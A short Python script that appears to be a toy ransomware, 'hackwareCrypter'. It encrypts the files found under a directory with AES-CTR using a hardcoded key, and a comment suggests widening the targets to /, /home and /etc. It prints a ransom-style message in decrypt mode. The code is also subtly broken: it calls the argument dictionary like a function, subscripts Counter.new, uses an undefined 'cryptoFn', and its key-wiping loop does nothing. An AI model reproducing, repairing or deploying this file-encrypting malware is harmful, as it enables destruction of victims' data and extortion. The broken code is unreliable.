#!/usr/bin/python3.9

# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import crypter

'''
By default in AES the password can have the following lengths:
128/192/256 bits
'''

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description='hackwareCrypter')
    parser.add_argument('-d', '--decrypt', help='decrypt the files [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args('decrypt')

    if decrypt:
        print('''
        HACKWARE STRIKE FORCE ʕ•́ᴥ•̀ʔっ

        Your files have been encrypted!
        To decrypt them use the following password: '{}'
        '''.format(HARDCODED_KEY))
        key = input('Type your password ʕ•́ᴥ•̀ʔっ ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new[128]
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt
    
    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]                                             # /, /home, /etc

    for currentDir in startDirs:
        for filename in discovery.discover(currentDir):
            crypter.change_files(filename, cryptoFn)
    

    # Clear encryption key from memory

    for _ in range(100):
        pass

    if not decrypt:
        pass

if __name__ == '__main__':
    main()
